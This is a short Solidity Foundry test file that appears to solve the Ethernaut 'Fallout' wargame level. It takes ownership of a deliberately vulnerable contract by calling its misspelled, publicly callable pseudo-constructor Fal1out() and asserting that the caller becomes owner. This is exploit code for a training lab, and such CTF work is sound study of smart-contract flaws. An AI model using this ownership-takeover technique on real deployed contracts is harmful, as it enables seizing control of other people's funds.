// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../instance/Level2.sol";

import "forge-std/Test.sol";

contract ExploitLevel02 is Test {
    Fallout instance = new Fallout();

    function setUp() external {}

    function testExploit() external {
        vm.broadcast();
        instance.Fal1out();
        assertEq(instance.owner(), msg.sender);
    }
}
